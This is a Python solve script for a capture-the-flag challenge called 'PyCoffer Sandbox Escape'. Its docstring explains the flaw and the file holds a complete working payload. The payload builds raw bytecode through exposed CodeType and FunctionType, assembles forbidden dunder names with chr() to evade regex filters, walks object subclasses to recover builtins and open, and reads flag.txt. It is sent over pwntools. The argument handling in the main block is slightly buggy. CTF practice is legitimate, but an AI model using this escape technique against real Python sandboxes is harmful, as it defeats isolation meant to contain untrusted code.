#!/usr/bin/env python3
"""
Solution for PyCoffer Sandbox Escape Challenge

[+] THE VULNERABILITY [+]

The sandbox exposes `FunctionType` and `CodeType` from the `types` module,
intending them to be "harmless" for inspection purposes.

However, these types can be used to CREATE new functions with arbitrary
bytecode! The key insight is:

1. CodeType lets us specify `co_names` - the attribute names used by LOAD_ATTR
2. The bytecode uses NUMERIC INDICES into co_names
3. Forbidden strings never appear in source - they're runtime-constructed!
4. The regex patterns can't catch what's hidden in bytecode constants

[+] THE EXPLOIT CHAIN [+]

1. Build forbidden attribute names using chr() - bypasses string patterns
2. Create CodeType with those names in co_names tuple
3. Create bytecode that traverses tuple -> class -> bases -> subclasses
4. Find a class with globals containing builtins
5. Extract the real file-opener function
6. Read the flag!

"""

FINAL_PAYLOAD = '''c = chr
u = c(95)
n1 = u+u+"class"+u+u
n2 = u+u+"bases"+u+u
n3 = u+u+"subclasses"+u+u
n4 = u+u+"init"+u+u
n5 = u+u+"globals"+u+u
n6 = u+u+"builtins"+u+u
opn = c(111)+c(112)+c(101)+c(110)
print("[*] Building bytecode for Python 3.14...")
bc1 = bytes([128, 0, 82, 1, 80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 80, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 94, 0, 44, 26, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 80, 5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 52, 0, 0, 0, 0, 0, 0, 0, 35, 0])
co1 = CodeType(0, 0, 0, 0, 2, 3, bc1, (None, ()), (n1, n2, n3), (), "x", "x", "x", 1, b"", b"", (), ())
f1 = FunctionType(co1, {})
cls_list = f1()
print(f"[+] Got {len(cls_list)} subclasses!")
bc2 = bytes([128, 0, 86, 0, 80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 80, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 35, 0])
co2 = CodeType(1, 0, 0, 1, 1, 3, bc2, (None,), (n4, n5), ("x",), "x", "x", "x", 1, b"", b"", (), ())
f2 = FunctionType(co2, {})
bc3 = bytes([128, 0, 86, 0, 80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 35, 0])
co3 = CodeType(1, 0, 0, 1, 1, 3, bc3, (None,), (opn,), ("m",), "x", "x", "x", 1, b"", b"", (), ())
f3 = FunctionType(co3, {})
print("[*] Searching for builtins...")
result = None
for klass in cls_list:
    try:
        g = f2(klass)
        if isinstance(g, dict) and n6 in g:
            bi = g[n6]
            if isinstance(bi, dict) and opn in bi:
                result = bi[opn]
            else:
                result = f3(bi)
            if result:
                print(f"[+] Found in {klass}")
                break
    except:
        pass
if result:
    print("[+] Reading flag.txt...")
    data = result("flag.txt").read()
    print(f"[FLAG] {data}")
else:
    print("[-] Failed")
END
'''

if __name__ == "__main__":
    print("Sending payload...")
    from pwn import *
    import sys
    if len(sys.argv) == 2:
        host = str(sys.argv[1])
        port = int(sys.argv[2])
        p = remote(host, port)
        p.sendlineafter(b">>> ", FINAL_PAYLOAD)
        p.interactive()
    else:
        p = process(["python3", "sandbox.py"]) if len(sys.argv) >= 1 and sys.argv[1] == "local" else remote("localhost", 1337)
        p.sendlineafter(b">>> ", FINAL_PAYLOAD)
        d = p.interactive()


